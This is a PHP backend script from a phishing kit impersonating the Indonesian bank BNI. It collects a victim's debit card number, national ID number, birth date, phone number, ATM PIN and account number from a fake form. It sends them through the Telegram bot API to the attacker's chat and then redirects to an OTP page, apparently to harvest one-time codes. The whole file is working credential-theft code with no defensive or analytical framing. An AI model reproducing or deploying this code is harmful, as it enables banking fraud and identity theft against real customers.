<?php 



session_start();
include "./telegram.php";

$_SESSION['phoneNumber'] = $_POST;

$message = "━─━────༺𝗕𝗡𝗜༻────━─━\n".
"𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁 :\n". $_POST['nomor_debit']. "\n𝗡𝗜𝗞 𝗞𝗧𝗣 : \n". $_POST['nik_ktp']."\n𝗧𝗮𝗻𝗴𝗴𝗮𝗹 𝗟𝗮𝗵𝗶𝗿 : \n". $_POST['lahir']. "\n𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 : \n". $_POST['nomorhandphone']. "\n𝗣𝗜𝗡 𝗔𝗧𝗠 : \n". $_POST['pinatm']. "\n𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴 : \n". $_POST['reke'];

function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location: otp.html");
?> 